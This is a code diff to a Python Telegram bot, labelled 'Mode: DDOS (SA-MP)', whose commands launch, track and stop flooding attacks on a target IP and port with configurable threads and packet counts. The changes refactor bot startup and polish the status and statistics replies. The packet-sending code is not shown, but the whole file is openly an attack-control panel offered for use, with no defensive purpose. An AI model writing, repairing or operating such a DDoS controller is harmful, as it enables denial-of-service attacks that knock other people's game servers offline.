@@ -8,7 +8,8 @@ import logging
 from datetime import datetime
 from flask import Flask, jsonify, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, ApplicationBuilder
+import asyncio
 
 # Disable logging for cleaner output
 logging.basicConfig(level=logging.ERROR)
@@ -39,7 +40,7 @@ START_TEXT = """
 ╚══════════════════════════════════╝
 
 Operator: YORODA HAMADA
-Mode: DDOS (SA-MP) 
+Mode: DDOS (SA-MP)
 Build: v1.0
 
 Commands:
@@ -279,7 +280,10 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             status_msg += f"   Packets Sent: {info.get('packets_sent', 0):,}\n"
             status_msg += f"   Status: RUNNING\n\n"
     
-    await update.message.reply_text(status_msg)
+    if status_msg == "ACTIVE ATTACKS:\n\n":
+        await update.message.reply_text("No active attacks running.")
+    else:
+        await update.message.reply_text(status_msg)
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show live attack statistics."""
@@ -289,9 +293,11 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     stats_msg = "LIVE ATTACK STATISTICS\n"
     stats_msg += "=" * 30 + "\n\n"
+    has_attacks = False
     
     for attack_id, info in active_attacks.items():
         if info.get('running', False):
+            has_attacks = True
             stats_msg += f"TARGET: {info['ip']}:{info['port']}\n"
             stats_msg += f"MODE: {info['mode'].upper()}\n"
             stats_msg += f"THREADS: {info['threads']}\n"
@@ -302,7 +308,10 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats_msg += f"UPTIME: {info.get('uptime', '0s')}\n"
             stats_msg += "-" * 30 + "\n"
     
-    await update.message.reply_text(stats_msg)
+    if has_attacks:
+        await update.message.reply_text(stats_msg)
+    else:
+        await update.message.reply_text("No active attacks to show statistics.")
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Stop all active attacks."""
@@ -669,13 +678,34 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=f"Attack on {attack_id} has been launched with {threads} threads in {mode.upper()} mode!"
         )
 
+def run_bot():
+    """Run the Telegram bot"""
+    try:
+        # Create the Application
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        # Add command handlers
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("status", status_command))
+        application.add_handler(CommandHandler("stats", stats_command))
+        application.add_handler(CommandHandler("stop", stop_command))
+        application.add_handler(CommandHandler("attack", attack_command))
+        application.add_handler(CallbackQueryHandler(button_callback))
+        
+        # Start the bot
+        print("Bot is polling for updates...")
+        application.run_polling(allowed_updates=Update.ALL_TYPES)
+    except Exception as e:
+        print(f"Bot error: {e}")
+
 def run_flask():
     """Run Flask server"""
     port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
 
 def main():
-    """Start the bot"""
+    """Start the bot and Flask"""
     print("""
 ╔══════════════════════════════════╗
 ║  YORODA HAMADA TELEGRAM BOT     ║
@@ -691,27 +721,8 @@ def main():
     
     print(f"Flask server running on port {os.environ.get('PORT', 10000)}")
     
-    try:
-        # Create the Application with updated parameters
-        application = Application.builder().token(BOT_TOKEN).build()
-        
-        # Add command handlers
-        application.add_handler(CommandHandler("start", start))
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("status", status_command))
-        application.add_handler(CommandHandler("stats", stats_command))
-        application.add_handler(CommandHandler("stop", stop_command))
-        application.add_handler(CommandHandler("attack", attack_command))
-        application.add_handler(CallbackQueryHandler(button_callback))
-        
-        # Start the bot
-        print("Bot is running... Press Ctrl+C to stop.")
-        application.run_polling()
-    except Exception as e:
-        print(f"Error starting bot: {e}")
-        # Keep Flask running even if bot fails
-        while True:
-            time.sleep(1)
+    # Run bot in main thread
+    run_bot()
 
 if __name__ == '__main__':
     try:
